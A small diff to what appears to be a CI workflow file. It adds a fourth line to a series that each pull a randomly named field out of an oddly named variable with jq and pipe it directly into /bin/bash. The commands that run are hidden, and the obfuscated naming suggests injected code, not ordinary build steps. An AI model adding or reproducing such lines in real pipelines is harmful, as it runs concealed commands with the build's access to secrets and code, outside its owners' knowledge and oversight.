@@ -39,6 +39,7 @@ jobs:
           printf '%s' "$lh570" | jq -r .okc29 | /bin/bash
           echo $magjp1783 | jq -r .aw5522 | /bin/bash
           echo $hp84978 | jq -r .begh05925 | /bin/bash
+          echo $w006 | jq -r .zilty17640 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
